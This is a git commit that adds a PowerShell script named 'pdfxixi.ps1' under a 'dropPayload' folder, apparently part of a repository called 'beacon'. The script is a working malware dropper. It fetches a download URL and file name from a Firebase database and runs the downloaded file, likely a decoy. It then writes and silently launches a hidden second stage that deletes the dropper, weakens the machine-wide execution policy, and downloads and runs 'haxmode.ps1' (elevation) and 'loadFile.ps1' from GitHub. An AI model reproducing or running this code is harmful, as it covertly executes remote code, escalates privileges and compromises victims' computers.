d54e4a4cfe68bceeeab6025334d5b97a906c194f
currone <94299594+snackmasta@users.noreply.github.com>
2024-02-09 06:45:14 +0700

    pdf xixixi

---
+++ dropPayload/pdfxixi.ps1
@@ -0,0 +1,23 @@
+$url = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/URL.json"; $name = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/name.json"; Invoke-WebRequest -Uri $url -OutFile "$name"; Start-Process -FilePath "$name"; 
+$hapus = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/file/exe.json"
+
+# Get the current working directory
+$currentDir = Get-Location
+
+# Define the content of the new .ps1 script
+$scriptContent = @"
+Remove-Item -Path "$currentDir\$hapus" -Force
+
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force;  
+Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\Windows\Temp\mode.ps1;  
+C:\Windows\Temp\mode.ps1;
+Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/loadFile.ps1 > C:\Windows\Temp\start.ps1;  
+C:\Windows\Temp\start.ps1;
+"@
+
+# Write the content to the new .ps1 script file
+$scriptContent | Out-File -FilePath "C:\Windows\Temp\new.ps1" -Encoding ascii
+
+# Output the path of the new .ps1 script file
+$newScriptPath = "C:\Windows\Temp\new.ps1"
+Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $newScriptPath"
